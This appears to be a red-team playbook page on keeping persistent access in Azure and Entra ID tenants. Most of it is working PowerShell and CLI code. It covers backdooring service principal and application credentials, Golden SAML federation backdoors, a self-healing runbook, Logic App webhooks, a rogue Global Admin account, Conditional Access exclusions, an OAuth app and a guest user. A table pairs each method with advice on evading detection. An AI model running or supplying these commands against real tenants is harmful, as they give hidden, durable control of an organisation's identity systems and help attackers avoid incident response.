# Azure Persistence
> **MITRE ATT&CK**: Persistence > T1098 - Account Manipulation
> **Platforms**: Azure / Entra ID
> **Required Privileges**: Medium to High
> **OPSEC Risk**: Medium

## Strategic Overview

Azure persistence mechanisms span the identity plane (Entra ID) and the resource plane
(ARM). The most durable persistence methods target the identity layer because Azure AD
objects survive resource deletions, subscription changes, and even some incident response
actions. A red team lead must understand that Azure AD persistence can outlast an entire
Azure subscription teardown -- if you persist in the identity plane, you survive the
infrastructure plane being rebuilt from scratch.

## Technical Deep-Dive

### Service Principal Credential Addition

```powershell
# Add a new client secret to an existing service principal
# This is the most common Azure persistence technique

# Find high-privilege service principals
$sps = Get-AzureADServicePrincipal -All $true
$sps | Where-Object {
    (Get-AzureADServiceAppRoleAssignment -ObjectId $_.ObjectId).ResourceDisplayName -contains "Microsoft Graph"
}

# Add a new password credential (valid for 2 years by default)
$sp = Get-AzureADServicePrincipal -ObjectId TARGET_SP_ID
New-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId `
  -EndDate (Get-Date).AddYears(2)
# Save the returned SecretText -- this is your persistent credential

# Authenticate as the service principal later
$secPassword = ConvertTo-SecureString "RETURNED_SECRET" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($sp.AppId, $secPassword)
Connect-AzureAD -ServicePrincipal -Credential $cred -TenantId $tenantId

# Azure CLI equivalent
az ad sp credential reset --id SP_APP_ID --append
# --append ensures existing credentials are not overwritten
```

### Application Secret / Certificate Addition

```powershell
# Add credentials to an Azure AD Application (not the SP)
$app = Get-AzureADApplication -ObjectId TARGET_APP_ID

# Password credential
New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId `
  -CustomKeyIdentifier "AuditKey" -EndDate (Get-Date).AddYears(3)

# Certificate credential (stealthier - no secret visible in portal)
$cert = New-SelfSignedCertificate -Subject "CN=AuditCert" -CertStoreLocation "Cert:\CurrentUser\My" `
  -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -NotAfter (Get-Date).AddYears(3)
$certData = [System.Convert]::ToBase64String($cert.GetRawCertData())
New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert `
  -Usage Verify -Value $certData

# Authenticate with certificate
Connect-AzureAD -TenantId $tenantId -ApplicationId $app.AppId `
  -CertificateThumbprint $cert.Thumbprint
```

### Federation Trust -- Golden SAML

```powershell
# Golden SAML: Configure a federation trust with attacker-controlled IdP
# This allows forging SAML tokens for any user in the tenant

# Using AADInternals to export the current signing certificate
Import-Module AADInternals
Get-AADIntAccessTokenForAADGraph -Credentials $cred

# Export token signing certificate from AD FS
Export-AADIntADFSSigningCertificate

# Set up federation with attacker-controlled domain
ConvertTo-AADIntBackdoor -Domain attacker-federated.target.com

# Now forge SAML assertions for any user
Open-AADIntOffice365Portal -ImmutableID "USER_IMMUTABLE_ID" `
  -Issuer "http://attacker-idp/adfs/services/trust" `
  -PfxFileName "stolen-signing.pfx" -UseBuiltInCertificate

# Golden SAML persists until:
# - Federation trust is removed
# - Signing certificate is rotated
# - The federated domain is removed
```

### Automation Account Runbook Backdoors

```powershell
# Create a scheduled runbook that maintains access
$runbookCode = @'
# Runs every 6 hours to ensure persistence
Connect-AzAccount -Identity

# Verify our backdoor SP still has credentials
$sp = Get-AzADServicePrincipal -DisplayName "svc-monitoring"
$creds = Get-AzADSpCredential -ObjectId $sp.Id
if ($creds.Count -lt 1) {
    # Re-add credential if removed
    New-AzADSpCredential -ObjectId $sp.Id -EndDate (Get-Date).AddYears(1)
    # Exfiltrate the new credential
    # ...
}
'@

# Create and schedule
az automation runbook create --automation-account-name target-auto \
  --resource-group target-rg --name health-check --type PowerShell
az automation schedule create --automation-account-name target-auto \
  --resource-group target-rg --name health-schedule \
  --frequency Hour --interval 6 --start-time "2024-01-01T00:00:00Z"
```

### Logic App Webhook Backdoors

```bash
# Create a Logic App with HTTP trigger (gives you a persistent webhook URL)
# When called, it executes with the Logic App's managed identity

# Logic App definition that executes arbitrary commands via ARM API
az logic workflow create --name audit-webhook --resource-group target-rg \
  --definition '{
    "definition": {
      "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
      "triggers": {
        "manual": {
          "type": "Request",
          "kind": "Http",
          "inputs": {"schema": {}}
        }
      },
      "actions": {
        "HTTP": {
          "type": "Http",
          "inputs": {
            "method": "GET",
            "uri": "https://management.azure.com/subscriptions?api-version=2020-01-01",
            "authentication": {"type": "ManagedServiceIdentity"}
          }
        }
      }
    }
  }'

# Retrieve the trigger URL (contains SAS token for auth)
az logic workflow show --name audit-webhook --resource-group target-rg \
  --query "accessEndpoint" -o tsv
```

### Azure AD User and Role Persistence

```powershell
# Create a new user with Global Admin role
$passwordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$passwordProfile.Password = "Pers1stent!Acc3ss"
$passwordProfile.ForceChangePasswordNextLogin = $false

New-AzureADUser -DisplayName "SVC Audit" -UserPrincipalName svc-audit@target.onmicrosoft.com `
  -PasswordProfile $passwordProfile -AccountEnabled $true -MailNickName svc-audit

# Assign Global Admin role
$role = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId `
  -RefObjectId (Get-AzureADUser -SearchString "svc-audit").ObjectId
```

### Conditional Access Policy Modification

```powershell
# Create an exemption in Conditional Access for your persistent identity
# Requires Conditional Access Administrator or Global Admin

# Add exclusion to all CA policies for the backdoor SP
$policies = Get-AzureADMSConditionalAccessPolicy
foreach ($policy in $policies) {
    $currentExclusions = $policy.Conditions.Users.ExcludeUsers
    $currentExclusions += "BACKDOOR_USER_OBJECT_ID"
    $params = @{
        PolicyId   = $policy.Id
        Conditions = @{Users = @{ExcludeUsers = $currentExclusions}}
    }
    Set-AzureADMSConditionalAccessPolicy @params
}
```

### OAuth Application with Persistent Permissions

```bash
# Create an app with delegated/application permissions that persist
az ad app create --display-name "Security Compliance Scanner" \
  --required-resource-accesses '[{
    "resourceAppId":"00000003-0000-0000-c000-000000000000",
    "resourceAccess":[
      {"id":"7ab1d382-f21e-4acd-a863-ba3e13f7da61","type":"Role"},
      {"id":"19dbc75e-c2e2-444c-a770-ec596d67b7ff","type":"Role"},
      {"id":"df021288-bdef-4463-88db-98f22de89214","type":"Role"}
    ]
  }]'

# Grant admin consent (if you have GA)
az ad app permission admin-consent --id APP_ID

# This app now has persistent access to Directory.Read.All, User.Read.All, etc.
# Even if the admin who consented is removed, the consent persists
```

### Guest User Invitation Abuse

```bash
# Invite a guest user and assign high privileges
az ad user invite --user-email-address attacker@external.com \
  --redirect-url "https://portal.azure.com"

# Assign role to guest
az role assignment create --assignee attacker@external.com \
  --role Contributor --scope /subscriptions/SUB_ID

# Guest users are often overlooked in security reviews
# They persist until explicitly removed from the tenant
```

## Detection & Evasion

| Persistence Method             | Detection                          | Evasion                               |
|--------------------------------|------------------------------------|---------------------------------------|
| SP credential addition         | Azure AD Audit Logs                | Use certificate creds (less visible)  |
| Golden SAML                    | Federation config changes          | Very hard to detect post-setup        |
| Runbook backdoor               | Automation job history             | Modify existing runbooks              |
| CA policy modification         | Audit log: Policy update           | Small changes during change windows   |
| Guest user                     | Azure AD user audit                | Use legitimate-looking external email |
| OAuth app consent              | App consent audit log              | Request minimal but useful perms      |

## Cross-References

- [Azure Initial Access](azure-initial-access.md)
- [Azure AD / Entra ID Attacks](azure-ad-attacks.md)
- [Azure Privilege Escalation](azure-privilege-escalation.md)
- [Cloud Attack Methodology](../cloud-methodology.md)

## References

- https://posts.specterops.io/azure-persistence-mechanisms
- https://github.com/Gerenios/AADInternals
- https://dirkjanm.io/azure-ad-persistence-backdoor/
- https://learn.microsoft.com/en-us/entra/identity/
- https://attack.mitre.org/techniques/T1098/
